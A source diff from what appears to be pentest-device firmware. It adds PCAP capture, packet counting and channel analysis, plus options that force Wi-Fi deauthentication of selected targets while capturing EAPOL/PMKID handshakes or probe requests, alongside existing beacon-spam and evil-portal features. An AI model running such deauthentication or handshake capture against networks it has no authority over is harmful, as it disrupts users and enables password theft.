@@ -78,8 +78,11 @@ static void wifi_deauth_run(uint8_t *bssid, uint8_t channel, const char *ssid);
 static uint16_t wifi_ap_list_print(bool up_dir);
 static void wifi_ap_list_free(void);
 static void wifi_draw_ap_info(void);
+static uint16_t sta_do_scan(void);
 static uint16_t wifi_selected_ap_count(void);
 static uint16_t wifi_selected_sta_count(void);
+static bool wifi_force_deauth_start(m1_resp_t *resp, uint8_t *target_count);
+static void wifi_force_deauth_stop(bool started);
 
 /*************** F U N C T I O N   I M P L E M E N T A T I O N ****************/
 
@@ -109,6 +112,9 @@ static uint16_t wifi_do_scan(void)
 	/* Free any previous results */
 	wifi_ap_list_free();
 
+	/* Clear any stale ESP32 scan state left by a previous AP-cache user. */
+	m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
+
 	/* Start scan — this blocks on ESP32 side until scan completes */
 	ret = m1_esp32_simple_cmd(CMD_WIFI_SCAN_START, &resp, WIFI_CMD_TIMEOUT_MS);
 	if (ret != 0 || resp.status != RESP_OK)
@@ -120,7 +126,10 @@ static uint16_t wifi_do_scan(void)
 	/* Parse AP count from response payload */
 	ap_count = resp.payload[0] | ((uint16_t)resp.payload[1] << 8);
 	if (ap_count == 0)
+	{
+		m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
 		return 0;
+	}
 
 	if (ap_count > WIFI_AP_MAX)
 		ap_count = WIFI_AP_MAX;
@@ -129,6 +138,7 @@ static uint16_t wifi_do_scan(void)
 	if (!ap_list)
 	{
 		ap_count = 0;
+		m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
 		return 0;
 	}
 	memset(ap_list, 0, ap_count * sizeof(wifi_ap_t));
@@ -167,6 +177,7 @@ static uint16_t wifi_do_scan(void)
 			ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5]);
 	}
 
+	m1_esp32_simple_cmd(CMD_WIFI_SCAN_STOP, &resp, 1000);
 	return ap_count;
 }
 
@@ -380,6 +391,242 @@ void wifi_scan_ap(void)
 #define SF_Y_START  22
 #define SF_Y_STEP   9
 
+#define WIFI_CAPTURE_CFG_FILE "wifi/capture.cfg"
+#define WIFI_PCAP_DIR          "pcap"
+#define WIFI_PCAP_RAW_HDR_LEN  14
+#define WIFI_PCAP_FLAG_FIRST   0x01
+#define WIFI_PCAP_FLAG_LAST    0x02
+
+typedef struct {
+	bool save_pcap;
+	bool force_pmkid;
+	bool force_probe;
+	bool ep_deauth;
+	bool loaded;
+} wifi_capture_cfg_t;
+
+typedef struct {
+	FIL fil;
+	bool active;
+	bool frame_open;
+	uint16_t expected_len;
+	uint16_t written_len;
+	uint32_t frames;
+	char path[32];
+} wifi_pcap_writer_t;
+
+static wifi_capture_cfg_t wifi_capture_cfg = {
+	.save_pcap = true,
+	.force_pmkid = false,
+	.force_probe = false,
+	.ep_deauth = false,
+	.loaded = false,
+};
+static wifi_pcap_writer_t wifi_pcap;
+
+static bool wifi_cfg_parse_bool(const char *v)
+{
+	if (!v) return false;
+	if (v[0] == 'o' || v[0] == 'O')
+		return (v[1] == 'n' || v[1] == 'N');
+	return (v[0] == '1' || v[0] == 'y' || v[0] == 'Y' ||
+		v[0] == 't' || v[0] == 'T');
+}
+
+static const char *wifi_onoff(bool v)
+{
+	return v ? "On" : "Off";
+}
+
+static void wifi_capture_cfg_load(void)
+{
+	FIL fil;
+	char line[64];
+
+	if (wifi_capture_cfg.loaded) return;
+	wifi_capture_cfg.loaded = true;
+
+	if (f_open(&fil, WIFI_CAPTURE_CFG_FILE, FA_READ) != FR_OK) return;
+
+	while (f_gets(line, sizeof(line), &fil))
+	{
+		char *eq = strchr(line, '=');
+		if (!eq) continue;
+		*eq++ = '\0';
+		if (strcmp(line, "SavePCAP") == 0)
+			wifi_capture_cfg.save_pcap = wifi_cfg_parse_bool(eq);
+		else if (strcmp(line, "ForcePMKID") == 0)
+			wifi_capture_cfg.force_pmkid = wifi_cfg_parse_bool(eq);
+		else if (strcmp(line, "ForceProbe") == 0)
+			wifi_capture_cfg.force_probe = wifi_cfg_parse_bool(eq);
+		else if (strcmp(line, "EPDeauth") == 0)
+			wifi_capture_cfg.ep_deauth = wifi_cfg_parse_bool(eq);
+	}
+
+	f_close(&fil);
+}
+
+static void wifi_capture_cfg_save(void)
+{
+	FIL fil;
+	char line[96];
+	UINT bw;
+
+	wifi_capture_cfg_load();
+	f_mkdir("wifi");
+	if (f_open(&fil, WIFI_CAPTURE_CFG_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
+		return;
+
+	int len = snprintf(line, sizeof(line),
+		"SavePCAP=%u\nForcePMKID=%u\nForceProbe=%u\nEPDeauth=%u\n",
+		wifi_capture_cfg.save_pcap ? 1 : 0,
+		wifi_capture_cfg.force_pmkid ? 1 : 0,
+		wifi_capture_cfg.force_probe ? 1 : 0,
+		wifi_capture_cfg.ep_deauth ? 1 : 0);
+	if (len > 0) f_write(&fil, line, len, &bw);
+	f_close(&fil);
+}
+
+static const char *wifi_pcap_path_for(uint8_t sniff_type)
+{
+	switch (sniff_type)
+	{
+	case SNIFF_BEACON: return "pcap/beacon.pcap";
+	case SNIFF_PROBE_REQ: return "pcap/probe.pcap";
+	case SNIFF_DEAUTH: return "pcap/deauth.pcap";
+	case SNIFF_EAPOL: return "pcap/eapol.pcap";
+	case SNIFF_PWNAGOTCHI: return "pcap/pwnagotchi.pcap";
+	case SNIFF_SAE: return "pcap/sae.pcap";
+	default: return "pcap/raw.pcap";
+	}
+}
+
+static void wifi_pcap_write_u16(uint8_t *p, uint16_t v)
+{
+	p[0] = v & 0xFF;
+	p[1] = (v >> 8) & 0xFF;
+}
+
+static void wifi_pcap_write_u32(uint8_t *p, uint32_t v)
+{
+	p[0] = v & 0xFF;
+	p[1] = (v >> 8) & 0xFF;
+	p[2] = (v >> 16) & 0xFF;
+	p[3] = (v >> 24) & 0xFF;
+}
+
+static bool wifi_pcap_open(uint8_t sniff_type)
+{
+	FILINFO info;
+	UINT bw;
+	uint8_t hdr[24];
+	const char *path;
+	bool need_header = true;
+
+	wifi_capture_cfg_load();
+	memset(&wifi_pcap, 0, sizeof(wifi_pcap));
+
+	if (!wifi_capture_cfg.save_pcap || sniff_type == SNIFF_SIGNAL)
+		return false;
+
+	f_mkdir(WIFI_PCAP_DIR);
+	path = wifi_pcap_path_for(sniff_type);
+	strncpy(wifi_pcap.path, path, sizeof(wifi_pcap.path) - 1);
+
+	if (f_stat(path, &info) == FR_OK && info.fsize >= sizeof(hdr))
+		need_header = false;
+
+	if (f_open(&wifi_pcap.fil, path, FA_WRITE | FA_OPEN_APPEND) != FR_OK)
+		return false;
+
+	if (need_header)
+	{
+		memset(hdr, 0, sizeof(hdr));
+		wifi_pcap_write_u32(&hdr[0], 0xA1B2C3D4);
+		wifi_pcap_write_u16(&hdr[4], 2);
+		wifi_pcap_write_u16(&hdr[6], 4);
+		wifi_pcap_write_u32(&hdr[16], 256);
+		wifi_pcap_write_u32(&hdr[20], 105); /* DLT_IEEE802_11 */
+		f_write(&wifi_pcap.fil, hdr, sizeof(hdr), &bw);
+	}
+
+	wifi_pcap.active = true;
+	return true;
+}
+
+static void wifi_pcap_close(void)
+{
+	if (!wifi_pcap.active) return;
+	f_close(&wifi_pcap.fil);
+	wifi_pcap.active = false;
+	wifi_pcap.frame_open = false;
+}
+
+static uint8_t wifi_pcap_poll(uint8_t max_chunks)
+{
+	m1_resp_t resp;
+	uint8_t frames = 0;
+
+	if (!wifi_pcap.active) return 0;
+
+	for (uint8_t i = 0; i < max_chunks; i++)
+	{
+		if (m1_esp32_simple_cmd(CMD_PKTMON_RAW_NEXT, &resp, 250) != 0 ||
+			resp.status != RESP_OK || resp.payload_len == 0)
+		{
+			break;
+		}
+
+		if (resp.payload_len < WIFI_PCAP_RAW_HDR_LEN) break;
+
+		uint8_t flags = resp.payload[0];
+		uint16_t orig_len = resp.payload[1] | ((uint16_t)resp.payload[2] << 8);
+		uint16_t cap_len = resp.payload[3] | ((uint16_t)resp.payload[4] << 8);
+		uint16_t offset = resp.payload[5] | ((uint16_t)resp.payload[6] << 8);
+		uint8_t chunk_len = resp.payload[7];
+		uint32_t ts_us = (uint32_t)resp.payload[10] |
+			((uint32_t)resp.payload[11] << 8) |
+			((uint32_t)resp.payload[12] << 16) |
+			((uint32_t)resp.payload[13] << 24);
+
+		if (chunk_len > resp.payload_len - WIFI_PCAP_RAW_HDR_LEN)
+			chunk_len = resp.payload_len - WIFI_PCAP_RAW_HDR_LEN;
+		if (chunk_len == 0) continue;
+
+		if ((flags & WIFI_PCAP_FLAG_FIRST) || !wifi_pcap.frame_open)
+		{
+			uint8_t rh[16];
+			UINT bw;
+			memset(rh, 0, sizeof(rh));
+			wifi_pcap_write_u32(&rh[0], ts_us / 1000000UL);
+			wifi_pcap_write_u32(&rh[4], ts_us % 1000000UL);
+			wifi_pcap_write_u32(&rh[8], cap_len);
+			wifi_pcap_write_u32(&rh[12], orig_len);
+			f_write(&wifi_pcap.fil, rh, sizeof(rh), &bw);
+			wifi_pcap.expected_len = cap_len;
+			wifi_pcap.written_len = 0;
+			wifi_pcap.frame_open = true;
+		}
+
+		if (offset == wifi_pcap.written_len && wifi_pcap.frame_open)
+		{
+			UINT bw;
+			f_write(&wifi_pcap.fil, &resp.payload[WIFI_PCAP_RAW_HDR_LEN], chunk_len, &bw);
+			wifi_pcap.written_len += chunk_len;
+		}
+
+		if ((flags & WIFI_PCAP_FLAG_LAST) ||
+			wifi_pcap.written_len >= wifi_pcap.expected_len)
+		{
+			wifi_pcap.frame_open = false;
+			wifi_pcap.frames++;
+			frames++;
+		}
+	}
+
+	return frames;
+}
+
 /* ---- ESP32 init helper ---- */
 static void ensure_esp32_ready(void)
 {
@@ -577,8 +824,18 @@ static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
 	uint16_t pkt_count = 0;
 	bool paused = false;
 	bool has_pkt = false;
+	bool pcap_active;
+	bool force_deauth_started = false;
+	uint8_t force_targets = 0;
 
 	ensure_esp32_ready();
+	wifi_capture_cfg_load();
+	pcap_active = wifi_pcap_open(sniff_type);
+	if (sniff_type == SNIFF_PROBE_REQ && wifi_capture_cfg.force_probe)
+	{
+		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
+	}
+	(void)force_targets;
 
 	/* Show starting screen */
 	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
@@ -593,14 +850,17 @@ static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
 	memset(&cmd, 0, sizeof(cmd));
 	cmd.magic = M1_CMD_MAGIC;
 	cmd.cmd_id = CMD_PKTMON_START;
-	cmd.payload_len = 3;
+	cmd.payload_len = 4;
 	cmd.payload[0] = sniff_type;
 	cmd.payload[1] = 0; /* channel 0 = hop all */
 	cmd.payload[2] = 5; /* 500ms hop interval */
+	cmd.payload[3] = pcap_active ? 0x01 : 0x00;
 
 	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
 	if (spi_ret != 0 || resp.status != RESP_OK)
 	{
+		wifi_pcap_close();
+		wifi_force_deauth_stop(force_deauth_started);
 		m1_u8g2_firstpage();
 		u8g2_DrawStr(&m1_u8g2, 6, 15, title);
 		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
@@ -630,6 +890,8 @@ static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
 			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
 			{
 				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
+				wifi_force_deauth_stop(force_deauth_started);
+				wifi_pcap_close();
 				xQueueReset(main_q_hdl);
 				break;
 			}
@@ -643,6 +905,8 @@ static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
 
 		if (paused) continue;
 
+		(void)wifi_pcap_poll(3);
+
 		/* Poll for next packet */
 		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
 		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len == 0)
@@ -652,6 +916,124 @@ static void wifi_sniffer_run(uint8_t sniff_type, const char *title)
 		memcpy(&last_resp, &resp, sizeof(m1_resp_t));
 		has_pkt = true;
 		sniffer_draw_packet(&last_resp, title, pkt_count, false);
+	}
+}
+
+/*============================================================================*/
+/*  Packet Count                                                              */
+/*============================================================================*/
+void wifi_packet_count(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	m1_cmd_t cmd;
+	m1_resp_t resp;
+	uint32_t total = 0;
+	uint32_t beacons = 0;
+	uint32_t probes = 0;
+	uint32_t deauths = 0;
+	uint32_t eapol = 0;
+	uint32_t sae = 0;
+	uint32_t raw = 0;
+	uint32_t other = 0;
+	int8_t last_rssi = 0;
+	uint8_t last_ch = 0;
+	char ln[26];
+	int spi_ret;
+	bool pcap_active;
+
+	ensure_esp32_ready();
+	wifi_capture_cfg_load();
+	pcap_active = wifi_pcap_open(SNIFF_ALL);
+
+	memset(&cmd, 0, sizeof(cmd));
+	cmd.magic = M1_CMD_MAGIC;
+	cmd.cmd_id = CMD_PKTMON_START;
+	cmd.payload_len = 4;
+	cmd.payload[0] = SNIFF_ALL;
+	cmd.payload[1] = 0;
+	cmd.payload[2] = 5;
+	cmd.payload[3] = pcap_active ? 0x01 : 0x00;
+
+	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
+	if (spi_ret != 0 || resp.status != RESP_OK)
+	{
+		wifi_pcap_close();
+		wifi_show_message("Packet Count", "Start failed", "Flash ESP32 FW?");
+		return;
+	}
+
+	while (1)
+	{
+		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(SNIFF_POLL_MS));
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
+				wifi_pcap_close();
+				xQueueReset(main_q_hdl);
+				break;
+			}
+		}
+
+		(void)wifi_pcap_poll(3);
+
+		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
+		if (spi_ret == 0 && resp.status == RESP_OK && resp.payload_len >= 4)
+		{
+			total++;
+			last_rssi = (int8_t)resp.payload[1];
+			last_ch = resp.payload[2];
+			switch (resp.payload[0])
+			{
+			case SNIFF_BEACON:
+			case SNIFF_PWNAGOTCHI:
+				beacons++;
+				break;
+			case SNIFF_PROBE_REQ:
+				probes++;
+				break;
+			case SNIFF_DEAUTH:
+				deauths++;
+				break;
+			case SNIFF_EAPOL:
+				eapol++;
+				break;
+			case SNIFF_SAE:
+				sae++;
+				break;
+			case SNIFF_ALL:
+				raw++;
+				break;
+			default:
+				other++;
+				break;
+			}
+		}
+
+		m1_u8g2_firstpage();
+		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
+			"PACKET COUNT");
+		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+		snprintf(ln, sizeof(ln), "Total:%lu CH:%u",
+			(unsigned long)total, last_ch);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+		snprintf(ln, sizeof(ln), "B:%lu P:%lu D:%lu",
+			(unsigned long)beacons, (unsigned long)probes, (unsigned long)deauths);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+		snprintf(ln, sizeof(ln), "E:%lu S:%lu R:%lu",
+			(unsigned long)eapol, (unsigned long)sae, (unsigned long)raw);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
+		snprintf(ln, sizeof(ln), "O:%lu RSSI:%d",
+			(unsigned long)other, last_rssi);
+		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
+		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
+		m1_u8g2_nextpage();
 	}
 }
 
@@ -774,6 +1156,109 @@ void wifi_signal_monitor(void)
 		}
 
 		m1_u8g2_nextpage();
+	}
+}
+
+/*============================================================================*/
+/*  Channel Analyzer                                                          */
+/*============================================================================*/
+void wifi_channel_analyzer(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	uint8_t scroll_top = 1;
+	bool redraw = true;
+	uint16_t counts[14];
+	int16_t rssi_sum[14];
+	int8_t best_rssi[14];
+	char ln[26];
+
+	ensure_esp32_ready();
+	wifi_show_message("Channel Analyzer", "Scanning APs...", NULL);
+	if (wifi_do_scan() == 0)
+	{
+		wifi_show_message("Channel Analyzer", "No APs found", NULL);
+		return;
+	}
+
+	while (1)
+	{
+		if (redraw)
+		{
+			memset(counts, 0, sizeof(counts));
+			memset(rssi_sum, 0, sizeof(rssi_sum));
+			for (uint8_t c = 1; c <= 13; c++) best_rssi[c] = -127;
+
+			for (uint16_t i = 0; i < ap_count; i++)
+			{
+				uint8_t ch = ap_list[i].channel;
+				if (ch < 1 || ch > 13) continue;
+				counts[ch]++;
+				rssi_sum[ch] += ap_list[i].rssi;
+				if (ap_list[i].rssi > best_rssi[ch])
+				{
+					best_rssi[ch] = ap_list[i].rssi;
+				}
+			}
+
+			m1_u8g2_firstpage();
+			u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+			u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
+				"CHANNEL ANALYZER");
+
+			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+			uint8_t y = SF_Y_START;
+			for (uint8_t ch = scroll_top; ch < scroll_top + 5 && ch <= 13; ch++)
+			{
+				if (counts[ch] > 0)
+				{
+					int avg = rssi_sum[ch] / counts[ch];
+					snprintf(ln, sizeof(ln), "C%u N%u A%d B%d",
+						ch, counts[ch], avg, best_rssi[ch]);
+				}
+				else
+				{
+					snprintf(ln, sizeof(ln), "%2u AP:0", ch);
+				}
+				u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
+			}
+			u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Rescan [BACK]Exit");
+			m1_u8g2_nextpage();
+			redraw = false;
+		}
+
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				xQueueReset(main_q_hdl);
+				break;
+			}
+			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK && scroll_top > 1)
+			{
+				scroll_top--;
+				redraw = true;
+			}
+			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK && scroll_top < 10)
+			{
+				scroll_top++;
+				redraw = true;
+			}
+			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				wifi_show_message("Channel Analyzer", "Rescanning...", NULL);
+				if (wifi_do_scan() == 0)
+				{
+					wifi_show_message("Channel Analyzer", "No APs found", NULL);
+					break;
+				}
+				redraw = true;
+			}
+		}
 	}
 }
 
@@ -1303,14 +1788,62 @@ void wifi_station_scan(void)
 						sta_list_print(false);
 					}
 				}
+		}
+	}
+}
+
+void wifi_scan_all(void)
+{
+	S_M1_Buttons_Status btn;
+	S_M1_Main_Q_t q_item;
+	BaseType_t ret;
+	uint16_t aps;
+	uint16_t stas;
+	char ln[26];
+
+	ensure_esp32_ready();
+
+	wifi_show_message("Scan All", "Scanning APs...", NULL);
+	aps = wifi_do_scan();
+
+	wifi_show_message("Scan All", "Scanning stations...", NULL);
+	stas = sta_do_scan();
+
+	m1_u8g2_firstpage();
+	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
+	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
+	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SCAN ALL");
+	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
+	snprintf(ln, sizeof(ln), "APs:%u", aps);
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
+	snprintf(ln, sizeof(ln), "Stations:%u", stas);
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Caches updated");
+	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Use Config views");
+	u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
+	m1_u8g2_nextpage();
+
+	while (1)
+	{
+		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
+		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
+		{
+			xQueueReceive(button_events_q_hdl, &btn, 0);
+			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
+			{
+				xQueueReset(main_q_hdl);
+				break;
 			}
 		}
 	}
+}
 
 
 /*============================================================================*/
 /*  Sniffer menu entry wrappers                                              */
 /*============================================================================*/
+void wifi_packet_monitor(void)   { wifi_sniffer_run(SNIFF_ALL, "Pkt Monitor"); }
+void wifi_raw_sniff(void)        { wifi_sniffer_run(SNIFF_ALL, "Raw Sniff"); }
 void wifi_sniff_all(void)        { wifi_sniffer_run(SNIFF_ALL, "All Packets"); }
 void wifi_sniff_beacon(void)     { wifi_sniffer_run(SNIFF_BEACON, "Beacons"); }
 void wifi_sniff_probe(void)      { wifi_sniffer_run(SNIFF_PROBE_REQ, "Probe Req"); }
@@ -1565,9 +2098,18 @@ void wifi_sniff_eapol(void)
 	uint16_t pmkid_count = 0;
 	bool paused = false;
 	bool has_pkt = false;
+	bool pcap_active;
+	bool force_deauth_started = false;
+	uint8_t force_targets = 0;
 	char ln[26];
 
 	ensure_esp32_ready();
+	wifi_capture_cfg_load();
+	pcap_active = wifi_pcap_open(SNIFF_EAPOL);
+	if (wifi_capture_cfg.force_pmkid)
+	{
+		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
+	}
 
 	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
 	m1_u8g2_firstpage();
@@ -1580,14 +2122,17 @@ void wifi_sniff_eapol(void)
 	memset(&cmd, 0, sizeof(cmd));
 	cmd.magic = M1_CMD_MAGIC;
 	cmd.cmd_id = CMD_PKTMON_START;
-	cmd.payload_len = 3;
+	cmd.payload_len = 4;
 	cmd.payload[0] = SNIFF_EAPOL;
 	cmd.payload[1] = 0;
 	cmd.payload[2] = 5;
+	cmd.payload[3] = pcap_active ? 0x01 : 0x00;
 
 	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
 	if (spi_ret != 0 || resp.status != RESP_OK)
 	{
+		wifi_force_deauth_stop(force_deauth_started);
+		wifi_pcap_close();
 		m1_u8g2_firstpage();
 		u8g2_DrawStr(&m1_u8g2, 6, 15, "EAPOL");
 		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
@@ -1612,6 +2157,8 @@ void wifi_sniff_eapol(void)
 			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
 			{
 				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
+				wifi_force_deauth_stop(force_deauth_started);
+				wifi_pcap_close();
 				xQueueReset(main_q_hdl);
 				break;
 			}
@@ -1624,6 +2171,8 @@ void wifi_sniff_eapol(void)
 		}
 
 		if (paused) continue;
+
+		(void)wifi_pcap_poll(3);
 
 		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
 		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len == 0)
@@ -1673,6 +2222,11 @@ void wifi_sniff_eapol(void)
 			else
 				sprintf(ln, "PMKID:no  Total:%d", pmkid_count);
 			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
+			if (force_deauth_started)
+			{
+				snprintf(ln, sizeof(ln), "Force:%d targets", force_targets);
+				u8g2_DrawStr(&m1_u8g2, 2, 63, ln);
+			}
 		}
 
 		m1_u8g2_nextpage();
@@ -1839,6 +2393,40 @@ static uint8_t wifi_build_selected_deauth_cmd(m1_cmd_t *cmd, uint8_t *ap_targets
 	if (sta_targets) *sta_targets = sta_count_used;
 	if (selected_total) *selected_total = wifi_selected_ap_count() + wifi_selected_sta_count();
 	return count;
+}
+
+static bool wifi_force_deauth_start(m1_resp_t *resp, uint8_t *target_count)
+{
+	m1_cmd_t cmd;
+	uint8_t ap_targets = 0;
+	uint8_t sta_targets = 0;
+	uint16_t selected_total = 0;
+	uint8_t count;
+
+	count = wifi_build_selected_deauth_cmd(&cmd, &ap_targets, &sta_targets, &selected_total);
+	if (target_count) *target_count = count;
+	if (count == 0) return false;
+
+	if (m1_esp32_send_cmd(&cmd, resp, SNIFF_CMD_TIMEOUT) != 0 ||
+		resp->status != RESP_OK)
+	{
+		if (target_count) *target_count = 0;
+		return false;
+	}
+
+	(void)ap_targets;
+	(void)sta_targets;
+	(void)selected_total;
+	return true;
+}
+
+static void wifi_force_deauth_stop(bool started)
+{
+	m1_resp_t resp;
+	if (started)
+	{
+		m1_esp32_simple_cmd(CMD_DEAUTH_STOP, &resp, 1000);
+	}
 }
 
 static void wifi_deauth_selected_run(void)
@@ -2197,6 +2785,7 @@ static void beacon_run_loop(const char *title, const char **ssids, uint8_t ssid_
 #define BEACON_LIST_MAX_SSIDS 32
 #define BEACON_LIST_LINE_MAX  96
 #define BEACON_RANDOM_PICK_N  16
+#define WIFI_SSID_LIST_FILE   "wifi/ssids.txt"
 
 typedef enum {
 	BEACON_LIST_ALL = 0,
@@ -2206,6 +2795,7 @@ typedef enum {
 
 static char beacon_file_ssids[BEACON_LIST_MAX_SSIDS][33];
 static const char *beacon_file_ptrs[BEACON_LIST_MAX_SSIDS];
+static uint8_t beacon_file_count = 0;
 
 static uint8_t beacon_ascii_lower(uint8_t c)
 {
@@ -2311,6 +2901,7 @@ static uint8_t beacon_load_list_file(const S_M1_file_info *f_info)
 
 	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
 	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
+	beacon_file_count = 0;
 
 	while (count < BEACON_LIST_MAX_SSIDS && f_gets(line, sizeof(line), &fil) != NULL)
 	{
@@ -2334,13 +2925,14 @@ static uint8_t beacon_load_list_file(const S_M1_file_info *f_info)
 			continue;
 		}
 
-		strncpy(beacon_file_ssids[count], ssid, 32);
-		beacon_file_ssids[count][32] = '\0';
+		memcpy(beacon_file_ssids[count], ssid, len);
+		beacon_file_ssids[count][len] = '\0';
 		beacon_file_ptrs[count] = beacon_file_ssids[count];
 		count++;
 	}
 
 	f_close(&fil);
+	beacon_file_count = count;
 	return count;
 }
 
@@ -2508,12 +3100,17 @@ void wifi_attack_beacon(void)
 
 #define WIFI_AP_CACHE_DIR  "wifi"
 #define WIFI_AP_CACHE_FILE "wifi/aps.tsv"
+#define WIFI_STA_CACHE_FILE "wifi/stations.tsv"
 #define WIFI_AP_CACHE_LINE_MAX 128
 #define WIFI_JOIN_PASS_MAX 63
 #define EP_HTML_MAX_BYTES 32768
 #define EP_HTML_CHUNK_BYTES M1_MAX_PAYLOAD
+#define WIFI_PORTAL_CFG_FILE "wifi/portal.cfg"
 
 static char wifi_portal_ssid[33] = "Free WiFi";
+static char wifi_portal_html_path[128];
+static char wifi_portal_html_name[33];
+static bool wifi_portal_cfg_loaded = false;
 
 static bool wifi_ext_is_ap_cache(const char *name)
 {
@@ -2541,6 +3138,88 @@ static bool wifi_ext_is_html(const char *name)
 	}
 
 	return (strcmp(ext, ".html") == 0 || strcmp(ext, ".htm") == 0);
+}
+
+static void wifi_portal_name_from_path(const char *path, char *name, size_t name_len)
+{
+	const char *base;
+
+	if (!name || name_len == 0)
+	{
+		return;
+	}
+
+	name[0] = '\0';
+	if (!path || path[0] == '\0')
+	{
+		return;
+	}
+
+	base = strrchr(path, '/');
+	base = base ? base + 1 : path;
+	strncpy(name, base, name_len - 1);
+	name[name_len - 1] = '\0';
+}
+
+static void wifi_portal_cfg_load(void)
+{
+	FIL fil;
+	char line[160];
+
+	if (wifi_portal_cfg_loaded)
+	{
+		return;
+	}
+	wifi_portal_cfg_loaded = true;
+
+	if (f_open(&fil, WIFI_PORTAL_CFG_FILE, FA_READ) != FR_OK)
+	{
+		return;
+	}
+
+	while (f_gets(line, sizeof(line), &fil) != NULL)
+	{
+		char *p = beacon_trim_line(line);
+		if (strncmp(p, "ssid=", 5) == 0)
+		{
+			strncpy(wifi_portal_ssid, p + 5, sizeof(wifi_portal_ssid) - 1);
